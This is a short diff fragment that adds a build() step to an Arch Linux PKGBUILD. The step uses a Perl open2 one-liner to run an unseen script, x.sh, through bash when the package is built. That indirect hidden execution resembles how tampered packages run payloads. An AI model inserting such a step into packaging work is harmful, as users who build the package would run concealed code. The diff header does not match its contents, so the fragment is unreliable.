@@ -1,0 +1,6 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,20 +1,60 @@
++build() {
++  perl -e "open2(my $o,my $i, qq[bash $PWD/x.sh])"
++}
